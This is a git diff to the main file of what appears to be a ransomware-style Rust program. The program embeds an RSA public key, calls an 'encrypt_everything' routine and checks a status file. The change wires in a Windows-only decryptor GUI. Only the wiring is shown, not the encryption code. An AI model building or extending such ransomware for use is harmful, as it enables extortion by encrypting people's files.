@@ -1,5 +1,7 @@
 mod encryptor;
 mod decryptor;
+#[cfg(windows)]
+mod decryptor_gui;
 
 use std::fs;
 use rsa::pkcs8::DecodePublicKey;
@@ -8,6 +10,9 @@ use anyhow::Result;
 use ::decryptor::helpers::gen_new_path;
 use crate::decryptor::{get_status_data, StatusReadError};
 use crate::encryptor::encrypt_everything;
+
+#[cfg(windows)]
+use crate::decryptor_gui::start_decryptor_gui;
 
 const BIGRAT_PNG: &[u8; 1044942] = include_bytes!("../../bigrat.png");
 const PUBLIC_KEY: &[u8; 294] = include_bytes!("../../public-key.der");
@@ -26,7 +31,11 @@ fn main() -> Result<()> {
     match get_status_data(&working_path) {
         Ok(data) => {
             dbg!(data);
-            todo!("Start decryptor GUI")
+
+            #[cfg(windows)]
+            start_decryptor_gui()?;
+            #[cfg(not(windows))]
+            todo!("Non-Windows decryptor UI")
         }
         Err(err) => {
             match err {
